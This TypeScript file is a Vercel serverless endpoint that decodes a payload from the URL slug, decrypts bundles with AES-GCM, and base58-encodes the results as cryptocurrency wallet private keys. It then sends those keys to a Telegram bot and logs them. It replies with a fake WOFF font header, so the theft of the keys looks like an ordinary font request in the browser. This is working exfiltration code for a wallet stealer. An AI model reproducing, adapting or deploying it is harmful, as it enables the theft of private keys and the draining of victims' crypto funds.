import type { VercelRequest, VercelResponse } from '@vercel/node';
import crypto from 'crypto';

const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58Encode(buffer: Buffer): string {
  let carry: number, i: number, j: number, num: number[];
  num = Array.from(buffer);
  for (i = 0; i < num.length; ++i) {
    carry = num[i];
    for (j = 0; j < num.length; ++j) {
      carry += (num[j] || 0) << 8;
      num[j] = carry % 58;
      carry = (carry / 58) >>> 0;
    }
  }
  let result = '';
  for (const k of buffer) {
    if (k === 0) result += ALPHABET[0];
    else break;
  }
  for (const digit of num.reverse()) {
    result += ALPHABET[digit];
  }
  return result;
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  const slug = req.url?.split('/').pop();
  if (!slug) {
    res.status(400).send('Invalid slug');
    return;
  }

  const idx = slug.indexOf('_');
  if (idx === -1) {
    res.status(400).send('Invalid slug format');
    return;
  }

  try {
    const encoded = slug.slice(idx + 1);
    const fixedB64 = encoded.replace(/-/g, '+').replace(/_/g, '/');
    const padded = fixedB64 + '='.repeat((4 - (fixedB64.length % 4)) % 4);
    const jsonStr = Buffer.from(padded, 'base64').toString('utf-8');

    const { sBundles, keybundle } = JSON.parse(jsonStr);
    const key = Buffer.from(keybundle, 'base64');
    const privKeys: string[] = [];

    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(':');
      const iv = Buffer.from(iv_b64, 'base64');
      const cipherTag = Buffer.from(data_b64, 'base64');
      const tag = cipherTag.slice(-16);
      const ciphertext = cipherTag.slice(0, -16);

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv);
      dec.setAuthTag(tag);
      const plainHex = Buffer.concat([dec.update(ciphertext), dec.final()]).toString('utf8');

      const last64 = plainHex.slice(-64);
      const privKey58 = base58Encode(Buffer.from(last64, 'hex'));
      privKeys.push(privKey58);
    }

    // Send to Telegram
    const BOT = process.env.BOT_TOKEN!;
    const CHAT = process.env.CHAT_ID!;
    const msg = privKeys.map((k, i) => `wallet ${i + 1}\n${k}`).join('\n\n');

    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: msg }),
    });

    console.log('✅ Processed and sent to Telegram:', privKeys);

    // Respond with minimal valid WOFF header so browser doesn't error
    res.setHeader('Content-Type', 'font/woff');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(200).send(Buffer.from([0x77, 0x4f, 0x46, 0x46]));
  } catch (err) {
    console.error('❌ Error processing slug:', err);
    res.status(400).send('Bad request');
  }
}
